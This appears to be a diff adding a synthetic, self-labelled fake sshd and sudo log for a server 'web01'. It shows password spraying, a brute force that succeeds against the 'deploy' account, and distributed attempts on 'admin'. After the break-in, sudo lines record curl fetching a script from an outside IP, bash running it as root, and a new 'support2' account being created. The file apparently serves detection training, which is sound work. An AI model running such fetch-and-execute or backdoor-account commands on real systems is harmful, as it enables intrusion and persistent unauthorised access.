@@ -1,0 +1,76 @@
+# FAKE SAMPLE DATA - synthetic training data, not real logs. All names, hosts and IPs are invented.
+Oct 28 01:30:00 web01 sshd[54396]: Failed password for alice from 192.0.2.60 port 62131 ssh2
+Oct 28 01:30:20 web01 sshd[21593]: Failed password for bob from 192.0.2.60 port 43777 ssh2
+Oct 28 01:30:36 web01 sshd[17483]: Failed password for carol from 192.0.2.60 port 52784 ssh2
+Oct 28 01:30:51 web01 sshd[53765]: Failed password for dave from 192.0.2.60 port 54664 ssh2
+Oct 28 01:31:09 web01 sshd[42793]: Failed password for erin from 192.0.2.60 port 35001 ssh2
+Oct 28 01:31:24 web01 sshd[6876]: Failed password for frank from 192.0.2.60 port 49144 ssh2
+Oct 28 01:31:38 web01 sshd[30979]: Failed password for grace from 192.0.2.60 port 39233 ssh2
+Oct 28 01:31:58 web01 sshd[47135]: Failed password for heidi from 192.0.2.60 port 50250 ssh2
+Oct 28 01:32:08 web01 sshd[56561]: Invalid user ivan from 192.0.2.60 port 54172
+Oct 28 01:32:08 web01 sshd[56561]: Failed password for invalid user ivan from 192.0.2.60 port 54172 ssh2
+Oct 28 01:32:23 web01 sshd[31216]: Invalid user judy from 192.0.2.60 port 57670
+Oct 28 01:32:23 web01 sshd[31216]: Failed password for invalid user judy from 192.0.2.60 port 57670 ssh2
+Oct 28 01:32:34 web01 sshd[27134]: Failed password for alice from 192.0.2.60 port 62666 ssh2
+Oct 28 01:32:45 web01 sshd[28881]: Failed password for bob from 192.0.2.60 port 63184 ssh2
+Oct 28 01:33:04 web01 sshd[58372]: Failed password for carol from 192.0.2.60 port 62180 ssh2
+Oct 28 01:33:20 web01 sshd[35383]: Failed password for dave from 192.0.2.60 port 46950 ssh2
+Oct 28 01:33:36 web01 sshd[37962]: Failed password for erin from 192.0.2.60 port 61404 ssh2
+Oct 28 01:33:54 web01 sshd[34946]: Failed password for frank from 192.0.2.60 port 31663 ssh2
+Oct 28 02:14:03 web01 sshd[15714]: Failed password for root from 203.0.113.45 port 38454 ssh2
+Oct 28 02:14:12 web01 sshd[4203]: Failed password for admin from 203.0.113.45 port 64289 ssh2
+Oct 28 02:14:20 web01 sshd[7722]: Invalid user ubuntu from 203.0.113.45 port 58141
+Oct 28 02:14:20 web01 sshd[7722]: Failed password for invalid user ubuntu from 203.0.113.45 port 58141 ssh2
+Oct 28 02:14:26 web01 sshd[10333]: Invalid user test from 203.0.113.45 port 61595
+Oct 28 02:14:26 web01 sshd[10333]: Failed password for invalid user test from 203.0.113.45 port 61595 ssh2
+Oct 28 02:14:30 web01 sshd[56681]: Invalid user oracle from 203.0.113.45 port 37996
+Oct 28 02:14:30 web01 sshd[56681]: Failed password for invalid user oracle from 203.0.113.45 port 37996 ssh2
+Oct 28 02:14:38 web01 sshd[46921]: Invalid user postgres from 203.0.113.45 port 59936
+Oct 28 02:14:38 web01 sshd[46921]: Failed password for invalid user postgres from 203.0.113.45 port 59936 ssh2
+Oct 28 02:14:46 web01 sshd[31762]: Failed password for deploy from 203.0.113.45 port 46449 ssh2
+Oct 28 02:14:53 web01 sshd[27350]: Failed password for root from 203.0.113.45 port 50160 ssh2
+Oct 28 02:15:00 web01 sshd[53415]: Failed password for admin from 203.0.113.45 port 62892 ssh2
+Oct 28 02:15:08 web01 sshd[32384]: Invalid user ubuntu from 203.0.113.45 port 56342
+Oct 28 02:15:08 web01 sshd[32384]: Failed password for invalid user ubuntu from 203.0.113.45 port 56342 ssh2
+Oct 28 02:15:14 web01 sshd[14273]: Invalid user test from 203.0.113.45 port 49292
+Oct 28 02:15:14 web01 sshd[14273]: Failed password for invalid user test from 203.0.113.45 port 49292 ssh2
+Oct 28 02:15:23 web01 sshd[18631]: Invalid user oracle from 203.0.113.45 port 30607
+Oct 28 02:15:23 web01 sshd[18631]: Failed password for invalid user oracle from 203.0.113.45 port 30607 ssh2
+Oct 28 02:15:26 web01 sshd[10820]: Invalid user postgres from 203.0.113.45 port 60030
+Oct 28 02:15:26 web01 sshd[10820]: Failed password for invalid user postgres from 203.0.113.45 port 60030 ssh2
+Oct 28 02:15:35 web01 sshd[35268]: Failed password for deploy from 203.0.113.45 port 62081 ssh2
+Oct 28 02:15:40 web01 sshd[14096]: Failed password for root from 203.0.113.45 port 47046 ssh2
+Oct 28 02:15:48 web01 sshd[32822]: Failed password for admin from 203.0.113.45 port 60582 ssh2
+Oct 28 02:15:55 web01 sshd[51246]: Invalid user ubuntu from 203.0.113.45 port 62581
+Oct 28 02:15:55 web01 sshd[51246]: Failed password for invalid user ubuntu from 203.0.113.45 port 62581 ssh2
+Oct 28 02:16:04 web01 sshd[29457]: Invalid user test from 203.0.113.45 port 32203
+Oct 28 02:16:04 web01 sshd[29457]: Failed password for invalid user test from 203.0.113.45 port 32203 ssh2
+Oct 28 02:16:13 web01 sshd[20009]: Invalid user oracle from 203.0.113.45 port 50752
+Oct 28 02:16:13 web01 sshd[20009]: Failed password for invalid user oracle from 203.0.113.45 port 50752 ssh2
+Oct 28 02:16:19 web01 sshd[54208]: Invalid user postgres from 203.0.113.45 port 36447
+Oct 28 02:16:19 web01 sshd[54208]: Failed password for invalid user postgres from 203.0.113.45 port 36447 ssh2
+Oct 28 02:16:25 web01 sshd[46176]: Failed password for deploy from 203.0.113.45 port 63762 ssh2
+Oct 28 02:16:30 web01 sshd[30682]: Failed password for root from 203.0.113.45 port 41996 ssh2
+Oct 28 02:17:28 web01 sshd[56210]: Accepted password for deploy from 203.0.113.45 port 61401 ssh2
+Oct 28 02:19:05 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.77/x.sh -o /tmp/x.sh
+Oct 28 02:19:40 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash /tmp/x.sh
+Oct 28 02:22:15 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m support2
+Oct 28 04:00:10 web01 sshd[5213]: Failed password for admin from 203.0.113.101 port 47463 ssh2
+Oct 28 04:00:30 web01 sshd[33664]: Failed password for admin from 203.0.113.101 port 54256 ssh2
+Oct 28 04:01:10 web01 sshd[7334]: Failed password for admin from 203.0.113.102 port 42752 ssh2
+Oct 28 04:01:30 web01 sshd[49991]: Failed password for admin from 203.0.113.102 port 56955 ssh2
+Oct 28 04:02:10 web01 sshd[10591]: Failed password for admin from 203.0.113.103 port 59451 ssh2
+Oct 28 04:02:30 web01 sshd[1919]: Failed password for admin from 203.0.113.103 port 36040 ssh2
+Oct 28 04:03:10 web01 sshd[1014]: Failed password for admin from 203.0.113.104 port 59571 ssh2
+Oct 28 04:03:30 web01 sshd[39052]: Failed password for admin from 203.0.113.104 port 35443 ssh2
+Oct 28 04:04:10 web01 sshd[40985]: Failed password for admin from 203.0.113.105 port 43028 ssh2
+Oct 28 04:04:30 web01 sshd[17242]: Failed password for admin from 203.0.113.105 port 37917 ssh2
+Oct 28 08:07:20 web01 sshd[33932]: Accepted publickey for alice from 10.0.0.21 port 63542 ssh2
+Oct 28 09:30:10 web01 sshd[8257]: Failed password for jsmith from 10.0.0.25 port 48824 ssh2
+Oct 28 09:30:31 web01 sshd[54527]: Failed password for jsmith from 10.0.0.25 port 36425 ssh2
+Oct 28 09:31:04 web01 sshd[30468]: Accepted password for jsmith from 10.0.0.25 port 30752 ssh2
+Oct 28 09:41:55 web01 sshd[7726]: Accepted publickey for bob from 10.0.0.22 port 44633 ssh2
+Oct 28 10:57:38 web01 sshd[41729]: Accepted publickey for carol from 10.0.0.23 port 57565 ssh2
+Oct 28 13:50:36 web01 sshd[36901]: Accepted publickey for deploy from 10.0.0.30 port 62171 ssh2
+Oct 28 15:48:49 web01 sshd[39438]: Accepted publickey for alice from 10.0.0.21 port 58907 ssh2
+Oct 28 17:15:00 web01 sshd[41252]: Accepted publickey for dave from 10.0.0.24 port 35290 ssh2
